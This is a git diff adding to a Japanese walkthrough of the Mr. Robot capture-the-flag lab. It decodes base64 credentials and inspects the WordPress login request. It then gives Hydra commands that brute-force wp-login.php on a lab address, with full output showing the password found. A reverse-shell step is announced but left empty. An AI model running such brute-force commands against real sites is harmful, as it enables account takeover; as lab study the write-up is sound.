@@ -233,6 +233,9 @@ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 --decode
 `http://192.168.56.120/wp-login.php`
 <img width="1401" height="768" alt="image" src="https://github.com/user-attachments/assets/910ebe33-df15-41a3-8c79-0752ec2d4724" />
 <img width="356" height="506" alt="image" src="https://github.com/user-attachments/assets/67a95fda-81f6-49d0-a49e-54955707a5b1" />
+
+F12でデベロッパーツールを使用（Networkタブ）＞All＞RequestでRawを選択
+<img width="1392" height="301" alt="image" src="https://github.com/user-attachments/assets/05f1cf22-83f9-4de4-85ef-58c45fbc7091" />
 <img width="1396" height="735" alt="image" src="https://github.com/user-attachments/assets/a85718f7-074c-48af-971f-0dd5bf2f0623" />
 
 ログイン成功
@@ -250,4 +253,44 @@ Burpで不具合。
 
 ３．testユーザーというものは存在しない　
 
-12.
+12.オンラインパスワードクラッカーでフォーム認証を攻撃する
+
+  Hydraを使用
+  
+  まず狙うのはユーザ名の特定（使用するワードファイルは作成したfilterd\fsociety.dic）
+
+- testユーザー
+- -L：ユーザー名リストを指定
+- -p：パスワードを指定
+```bash
+#作業ディレクトリのfilter_fsocity.dicを使用するため階層は変えておく
+hydra 192.168.56.120 -l elliot -P ./filter_fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:Invalid username"
+```
+→　みつからず
+
+- elliot1ユーザー
+- -l：ユーザを指定
+- -P：パスワード候補リストを指定
+
+is correctを指定
+```bash
+hydra 192.168.56.120 -l elliot -P ./filter_fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:is incorrect"
+```
+パスワードを発見
+```bash
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 17:50:33
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
+[DATA] attacking http-post-form://192.168.56.120:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.120%2Fwp-admin%2F&testcookie=1:is incorrect
+[STATUS] 1247.00 tries/min, 1247 tries in 00:01h, 10205 to do in 00:09h, 16 active
+[STATUS] 1287.67 tries/min, 3863 tries in 00:03h, 7589 to do in 00:06h, 16 active
+[80][http-post-form] host: 192.168.56.120   login: elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 17:53:41
+```
+13.PHPのリバースシェルを設置する
+- gitから入手したリバースシェル使用
+  
+```
+
+```
+14.
